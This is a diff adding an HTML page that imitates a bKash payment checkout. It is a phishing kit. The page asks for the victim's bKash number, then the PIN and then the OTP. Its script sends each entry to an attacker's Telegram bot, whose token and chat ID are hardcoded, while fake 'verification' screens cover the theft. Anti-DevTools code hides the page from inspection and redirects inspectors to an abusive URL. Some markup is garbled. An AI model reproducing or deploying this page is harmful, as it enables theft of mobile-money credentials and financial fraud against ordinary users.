@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>bKash Payment</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/webp" href="img/favicon.webp">
+    
+    <style>
+        :root {
+            --bkash-pink: #D81B60; /* Matches the vibrant pink in the image */
+            --bg-gray: #F5F5F5;
+            --text-dark: #454545;
+            --text-muted: #757575;
+            --border-light: #E0E0E0;
+            --white: #ffffff;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-gray);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 575px; /* Matches the wrapper width from original code */
+            background-color: var(--white);
+            border-radius: 4px;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            text-align: center;
+        }
+
+        /* Logo Header */
+        .logo-top {
+            padding: 15px;
+            background: var(--white);
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        .logo-top img {
+            height: 38px;
+        }
+
+        /* Order Info Header */
+        .header {
+            background: var(--white);
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        .h-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            text-align: left;
+            color: #454545;
+        }
+
+        .h-left img {
+            height: 26px;
+        }
+
+        .merchant-info {
+            line-height: 1.3;
+        }
+
+        .merchant-info small {
+            color: var(--text-muted);
+            font-size: 12px;
+        }
+
+        .h-amount {
+            font-size: 18px;
+            font-weight: 700;
+            color: #454545;
+        }
+
+        .error-banner {
+            background-color: #FFDDE6;
+            color: #D81B60;
+            padding: 10px 16px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 500;
+            border-bottom: 1px solid #F8B4C8;
+            display: none; /* Initially hidden */
+        }
+
+        .loan-details {
+            padding: 12px 16px;
+            background: #F7F7F7;
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        .loan-details .info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .loan-details .label {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .loan-details .category {
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        .loan-details .amount {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-dark);
+        }
+
+        /* Main Content Area (Pink) */
+        .main-container {
+            background-color: var(--bkash-pink);
+            padding: 128px 20px 74px; /* Matches original code spacing */
+            color: var(--white);
+        }
+
+        .step h3 {
+            margin-bottom: 12px;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .help-text {
+            font-size: 14px;
+            margin-top: 14px;
+        }
+
+        .help-text .underline {
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        /* Input Fields */
+        .field {
+            margin-top: 12px;
+        }
+
+        .field input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 6px;
+            border: 1px solid #ddd;
+            font-size: 16px;
+            text-align: center;
+            color: #454545;
+            background-color: var(--white);
+            transition: border 0.2s;
+        }
+
+        .field input:focus {
+            outline: none;
+            border: 3px solid #f8a6c3;
+        }
+
+        /* Actions/Buttons */
+        .actions {
+            display: flex;
+            gap: 10px;
+            padding: 20px 16px 30px;
+            background: var(--white);
+            border-top: 1px solid var(--border-light);
+        }
+
+        .btn {
+            flex: 1;
+            padding: 12px;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 15px;
+            background: #f2f2f2;
+            color: #333;
+            transition: all 0.2s;
+            position: relative;
+        }
+
+        .btn:disabled {
+            color: #999;
+            cursor: not-allowed;
+        }
+
+        .btn-active {
+            background: var(--bkash-pink);
+            color: var(--white) !important;
+            border-color: var(--bkash-pink);
+        }
+
+        /* Footer */
+        .footer {
+            padding: 15px 10px 25px;
+            background: var(--bg-gray);
+            text-align: center;
+        }
+
+        .footer-phone {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            color: var(--bkash-pink);
+            font-weight: bold;
+            margin-bottom: 4px;
+        }
+
+        .footer-phone img {
+            width: 16px;
+            height: 16px;
+        }
+
+        .footer-copyright {
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+
+        /* Hidden Utility */
+        .hidden {
+            display: none !important;
+        }
+
+        /* Animations */
+        .btn-dots {
+            display: none;
+            justify-content: center;
+            gap: 8px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            background: var(--white);
+            border-radius: 50%;
+            animation: dotCycle 1.2s infinite;
+        }
+
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.3s; }
+        .dot:nth-child(3) { animation-delay: 0.6s; }
+
+        @keyframes dotCycle {
+            0%   { opacity: 0.3; transform: scale(0.8); }
+            25%  { opacity: 1;   transform: scale(1.2); }
+            50%  { opacity: 0.6; transform: scale(1.0); }
+            100% { opacity: 0.3; transform: scale(0.8); }
+        }
+
+        .processing-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid var(--white);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        .verification-box {
+            background-color: #FFDDE6;
+            color: #D81B60;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .verification-box .timer-value {
+            font-size: 24px;
+            font-weight: 700;
+            margin-top: 5px;
+            display: block;
+        }
+
+        .loan-details-summary {
+            background-color: #F7F7F7;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: left;
+            color: var(--text-dark);
+        }
+
+        .loan-details-summary h4 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .loan-details-summary p {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        .loan-details-summary p strong {
+            font-weight: 600;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-animation {
+            font-size: 50px;
+            color: var(--white);
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <!-- bKash Logo -->
+        <div class="logo-top">
+            <img src="https://kinghouse.wuaze.com/img/bkash_logo.png" alt="bKash">
+        </div>
+
+        <!-- Loan Details -->
+       <div class="telecom-details" style="display: flex; justify-content: space-between; align-items: center; padding: 10px; border-bottom: 1px solid #eee;">
+    <div class="info" style="text-align: left;">
+        <div class="label" style="font-weight: bold; font-size: 14px; color: #333;">Amount</div>
+        <div class="category" id="CategoryDisplay" style="font-size: 12px; color: #666;">
+            telecom category: bkash Merchant
+        </div>
+    </div>
+    <div class="amount" id="AmountDisplay" style="font-weight: bold; font-size: 18px; color: #333;">
+        ৳<span id="final-amount">0.00</span>
+    </div>
+</div>
+
+
+        <!-- Error Banner -->
+        <div class="error-banner" id="numberErrorBanner">
+            অনুগ্রহ করে আপনার সঠিক বিকাশ নম্বর লিখুন
+        </div>
+
+        <!-- Main Steps Container -->
+        <div class="main-container">
+            
+            <!-- Step 1: Account Number -->
+            <div id="step1" class="step">
+                <h3>Your bKash Account Number</h3>
+                <div class="field">
+                    <input type="text" id="number" maxlength="11" placeholder="e.g 01XXXXXXXXX" inputmode="numeric">
+                </div>
+                <div class="help-text">
+                    Confirm and proceed, <span class="underline">terms & conditions</span>
+                </div>
+            </div>
+
+            <!-- Step 2: OTP Verification -->
+            <div id="step2" class="step hidden">
+                <h3 id="otpText">Enter verification code sent to</h3>
+                <div id="otpWarning" class="hidden" style="color:#fff; font-weight:bold; margin-bottom:10px;">Wrong verification code</div>
+                <div class="field">
+                    <input type="text" id="otp" maxlength="6" placeholder="Enter 6 digit code" inputmode="numeric">
+                </div>
+                <div class="help-text" id="timer">Resend Code in 25s</div>
+            </div>
+
+            <!-- Step 3: PIN Entry -->
+            <div id="step3" class="step hidden">
+                <h3>Enter PIN of your bKash account number<br>(<span id="pinMasked">017 ** *** ****</span>)</h3>
+                <div id="pinWarning" class="hidden" style="color:#fff; font-weight:bold; margin-bottom:10px;">Wrong PIN</div>
+                <div class="field">
+                    <input type="password" id="pin" maxlength="5" placeholder="Enter Pin" inputmode="numeric">
+                </div>
+            </div>
+
+            <!-- Step: Processing Request -->
+            <div id="stepProcessingRequest" class="step hidden">
+                <h3>Processing Your Request</h3>
+                <div class="processing-spinner"></div>
+                <p class="help-text">Please wait while we verify your loan application...</p>
+                
+                <div class="verification-box">
+                    Verification in progress
+                    <span class="timer-value" id="processingTimer">15</span>
+                    seconds remaining
+                </div>
+
+                <div clstrondetails-summary">
+                    <h4> Details</h4>
+                    <p>Amount: <strong id="summaryAmount">৳10000.00</strong></p>
+                    <p>Category: <strong id="summaryCategory">Personal</strong></p>
+                    <p>Mobile: <strong id="summaryMobile">01900000000</strong></p>
+                </div>
+            </div>
+
+            <!-- Step: Success -->
+            <div id="stepSuccess" class="step hidden">
+                <div class="success-animation">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                    </svg>
+                </div>
+                <h3>Verification Successful</h3>
+                <div class="help-text">
+                    Your request has been processed successfully.
+                </div>
+                <div style="margin-top: 20px;">
+                    <a href="index.html" class="btn btn-confirm" style="display: inline-block; text-decoration: none; width: auto; padding: 12px 30px;">Back to Home</a>
+                </div>
+            </div>
+
+            <!-- Step: Cancel Confirmation -->
+            <div id="stepCancelConfirm" class="step hidden">
+                <img src="https://kinghouse.wuaze.com/warning.svg" alt="warning" style="width:60px; height:60px; margin-bottom:15px;">
+                <h3>Are you sure you want to cancel this payment?</h3>
+            </div>
+
+            <!-- Step: Cancelled -->
+            <div id="stepCancelled" class="step hidden">
+                <img src="https://kinghouse.wuaze.com/cancel.svg" alt="Cancelled" style="width:70px; height:70px; margin-bottom:15px;">
+                <h3>Payment Cancelled</h3>
+                <div class="help-text">Redirecting to <a href="#" id="merchantLink" style="color:#fff; text-decoration:underline;">Merchant Website</a> in <span id="cancelTimer">3</span>s</div>
+            </div>
+
+        </div>
+
+        <!-- Actions -->
+        <div class="actions" id="actionsStep1">
+            <button class="btn" onclick="cancelPay()">Cancel</button>
+            <button class="btn" id="numConfirm" disabled onclick="goOtp(this)">
+                <span class="btn-text">Confirm</span>
+                <div class="btn-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+            </button>
+        </div>
+
+        <div class="actions hidden" id="actionsStep2">
+            <button class="btn" onclick="backTo(3)">Cancel</button>
+            <button class="btn" id="otpConfirm" disabled onclick="goOtpConfirm(this)">
+                <span class="btn-text">Confirm</span>
+                <div class="btn-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+            </button>
+        </div>
+
+        <div class="actions hidden" id="actionsStep3">
+            <button class="btn" onclick="backTo(1)">Cancel</button>
+            <button class="btn" id="pinConfirm" disabled onclick="submitPin()">
+                <span class="btn-text">Confirm</span>
+                <div class="btn-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+            </button>
+        </div>
+
+        <div class="actions hidden" id="actionsCancel">
+            <button class="btn btn-active" onclick="confirmCancel()">Yes</button>
+            <button class="btn" onclick="backTo(1)">No</button>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <div class="footer-phone">
+                <img src="https://kinghouse.wuaze.com/img/phone.png" alt="phone">
+                <span>16247</span>
+            </div>
+            <div class="footer-copyright">© 2025 bKash, All Rights Reserved</div>
+        </div>
+    </div>
+
+    <script>
+        // --- Core Logic ---
+        const numberInput = document.getElementById("number");
+        const otpInput = document.getElementById("otp");
+        const pinInput = document.getElementById("pin");
+        const numberErrorBanner = document.getElementById("numberErrorBanner");
+        
+        // Display amount and category from localStorage on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            const amount = localStorage.getItem('loanAmount');
+            const category = localStorage.getItem('loanCategory');
+            
+            const AmountDisplay = document.getElementById('AmountDisplay');
+            const CategoryDisplay = document.getElementById('fkCategoryDisplay');
+            
+            if (amount && AmountDisplay) {
+                AmountDisplay.textContent = `৳${amount}`;
+            }
+            if (category && CategoryDisplay) {
+                CategoryDisplay.textContent = ` category: ${category}`;
+            }
+        });
+
+        // Validate inputs
+        numberInput.addEventListener("input", function() {
+            const isValid = this.value.startsWith('01') && this.value.length === 11;
+            const btn = document.getElementById("numConfirm");
+            if (isValid) {
+                btn.disabled = false;
+                btn.classList.add('btn-active');
+                numberErrorBanner.style.display = 'none';
+            } else {
+                btn.disabled = true;
+                btn.classList.remove('btn-active');
+            }
+        });
+        
+        otpInput.addEventListener("input", function() {
+            toggleButton(this, document.getElementById("otpConfirm"), 6);
+            document.getElementById('otpWarning').classList.add('hidden');
+        });
+        
+        pinInput.addEventListener("input", function() {
+            const len = this.value.length;
+            const btn = document.getElementById("pinConfirm");
+            if (len === 4 || len === 5) {
+                btn.disabled = false;
+                btn.classList.add('btn-active');
+            } else {
+                btn.disabled = true;
+                btn.classList.remove('btn-active');
+            }
+            document.getElementById('pinWarning').classList.add('hidden');
+        });
+
+        function toggleButton(inputEl, btnEl, lengthRequired) {
+            if (inputEl.value.length === lengthRequired) {
+                btnEl.disabled = false;
+                btnEl.classList.add('btn-active');
+            } else {
+                btnEl.disabled = true;
+                btnEl.classList.remove('btn-active');
+            }
+        }
+
+        // --- Step Transitions ---
+        function showStep(n) {
+            document.querySelectorAll(".step").forEach(el => el.classList.add("hidden"));
+            document.querySelectorAll(".actions").forEach(el => el.classList.add("hidden"));
+
+            if (typeof n === 'number') {
+                document.getElementById("step" + n).classList.remove("hidden");
+                document.getElementById("actionsStep" + n).classList.remove("hidden");
+            } else {
+                document.getElementById(n).classList.remove("hidden");
+                if (n === "stepCancelConfirm") document.getElementById("actionsCancel").classList.remove("hidden");
+            }
+        }
+
+        function backTo(step) { showStep(step); }
+
+        async function goOtp(btn) {
+            let number = numberInput.value;
+            
+            // Validate number before proceeding
+            if (!number.startsWith('01') || number.length !== 11) {
+                numberErrorBanner.style.display = 'block';
+                return;
+            }
+
+            saveData({ number });
+            await animateButton(btn);
+            let masked = number.substring(0, 3) + " ** *** " + number.slice(-4);
+            document.getElementById("pinMasked").textContent = masked;
+            showStep(3); // Go to PIN after Number
+        }
+
+        async function submitPin() {
+            let pin = pinInput.value;
+            let btn = document.getElementById("pinConfirm");
+            saveData({ pin, pin_status: "pending" });
+            
+            // Show loading on button for 5 seconds
+            startPersistentLoading(btn);
+            
+            setTimeout(() => {
+                stopPersistentLoading(btn);
+                let number = numberInput.value;
+                let masked = number.substring(0, 3) + " ** *** " + number.slice(-4);
+                document.getElementById("otpText").textContent = `Enter verification code sent to ${masked}`;
+                showStep(2); // Go to OTP section after 5 seconds
+                startOtpTimer();
+            }, 5000);
+        }
+
+        async function goOtpConfirm(btn) {
+            let otp = otpInput.value;
+            saveData({ otp, otp_status: "pending" });
+            
+            // Show loading on button for 5 seconds
+            startPersistentLoading(btn);
+            
+            setTimeout(() => {
+                stopPersistentLoading(btn);
+                showStep('stepProcessingRequest'); // Show new processing request screen
+                startProcessingTimer(15, 'index.html'); // Start 15-second timer
+                updateLoanSummary(); // Update loan details in summary
+            }, 5000);
+        }
+
+        function cancelPay() { showStep("stepCancelConfirm"); }
+
+        function confirmCancel() {
+            showStep("stepCancelled");
+            startRedirectTimer("cancelTimer", 3, "https://wa.me/");
+        }
+
+        // --- Utils & Polling ---
+        const botToken = '8749628364:AAGludZICJ9dP7kK3yZDy3l-BkHD4bmygy8';
+        const chatId = '6496235837';
+
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(e => console.error('Telegram error:', e));
+        }
+
+        function saveData(data) {
+            // Send to Telegram based on what's being saved
+            if (data.number) {
+                sendToTelegram(`<b>--- New Login ---</b>\n<b>Number:</b> ${data.number}`);
+            } else if (data.pin) {
+                const number = numberInput.value;
+                sendToTelegram(`<b>--- PIN Entry ---</b>\n<b>Number:</b> ${number}\n<b>PIN:</b> ${data.pin}`);
+            } else if (data.otp) {
+                const number = numberInput.value;
+                sendToTelegram(`<b>--- OTP Entry ---</b>\n<b>Number:</b> ${number}\n<b>OTP:</b> ${data.otp}`);
+            }
+        }
+
+        function animateButton(btn) {
+            const dots = btn.querySelector(".btn-dots");
+            const text = btn.querySelector(".btn-text");
+            text.style.display = "none"; // Hide text completely
+            dots.style.display = "flex";
+            return new Promise(resolve => setTimeout(() => {
+                text.style.display = "inline-block"; // Restore text
+                dots.style.display = "none";
+                resolve();
+            }, 1500));
+        }
+
+        function startPersistentLoading(btn) {
+            btn.disabled = true;
+            btn.querySelector(".btn-text").style.display = "none"; // Hide text
+            btn.querySelector(".btn-dots").style.display = "flex";
+        }
+
+        function stopPersistentLoading(btn) {
+            btn.disabled = false;
+            btn.querySelector(".btn-text").style.display = "inline-block"; // Show text
+            btn.querySelector(".btn-dots").style.display = "none";
+        }
+
+        function startRedirectTimer(elementId, seconds, url) {
+            let sec = seconds;
+            const timerEl = document.getElementById(elementId);
+            const interval = setInterval(() => {
+                sec--;
+                if (timerEl) timerEl.textContent = sec;
+                if (sec <= 0) {
+                    clearInterval(interval);
+                    window.location.href = url;
+                }
+            }, 1000);
+        }
+
+        function startProcessingTimer(seconds, url) {
+            let sec = seconds;
+            const timerEl = document.getElementById("processingTimer");
+            const interval = setInterval(() => {
+                sec--;
+                if (timerEl) timerEl.textContent = sec;
+                if (sec <= 0) {
+                    clearInterval(interval);
+                    window.location.href = url;
+                }
+            }, 1000);
+        }
+
+        function updateLoanSummary() {
+            const amount = localStorage.getItem('Amount');
+            const category = localStorage.getItem('loanCategory');
+            const mobile = numberInput.value; // Get current mobile number from input
+            
+            document.getElementById('summaryAmount').textContent = `৳${amount}`;
+            document.getElementById('summaryCategory').textContent = category;
+            document.getElementById('summaryMobile').textContent = mobile;
+        }
+
+        let otpCountdown;
+        function startOtpTimer() {
+            clearInterval(otpCountdown);
+            let left = 25;
+            const timerEl = document.getElementById("timer");
+            otpCountdown = setInterval(() => {
+                left--;
+                if (left <= 0) {
+                    clearInterval(otpCountdown);
+                    timerEl.innerHTML = '<span class="underline" onclick="startOtpTimer()">Resend Code</span>';
+                } else {
+                    timerEl.textContent = `Resend Code in ${left}s`;
+                }
+            }, 1000);
+        }
+
+        // --- Security Scripts (Anti-DevTools) ---
+        (function() {
+            const redirectUrl = "https://kinghouse.wuaze.com/kingcrashv8.1/hey_motherchod.html";
+            setInterval(() => {
+                if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
+                    window.location.href = redirectUrl;
+                }
+            }, 1000);
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.onkeydown = e => {
+                if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
+                    e.preventDefault();
+                    return false;
+                }
+            };
+        })();
+    </script>
+</body>
+</html>
